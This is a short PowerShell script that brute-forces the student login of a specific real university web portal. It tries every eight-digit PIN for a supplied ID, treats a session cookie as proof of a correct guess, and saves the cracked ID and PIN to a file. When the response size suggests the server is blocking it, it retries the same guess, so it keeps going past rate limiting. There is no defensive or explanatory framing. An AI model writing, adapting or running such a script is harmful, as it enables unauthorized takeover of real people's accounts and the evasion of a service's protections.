$url = "https://uos.sharjah.ac.ae:9050/prod_enUS/twbkwbis.P_ValLogin"
$ID = Read-Host "ID"
echo "Brute Forcing"
for ($i = 10000000; $i -le 99999999; $i++)
{
	#echo $i
	$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
	(curl $url -websession $session) > $NULL
	$response = curl -uri $url -websession $session -method post -body @{sid=$ID;PIN=$i}
	if ($session.Cookies.GetCookies($url).Name -eq "SESSID") #ValidLogin
	{
		echo "Password Correct!"
		echo "ID: $ID" "Password:$i" >> passwords.txt
		break
	}
	$size = $response.RawContentLength
	if ($size -gt 400)
	{
		if ($size -lt 2000)
		{
			$i-=1
			#echo "Server blocked incoming... Retrying"
		}
	}
}

echo Done!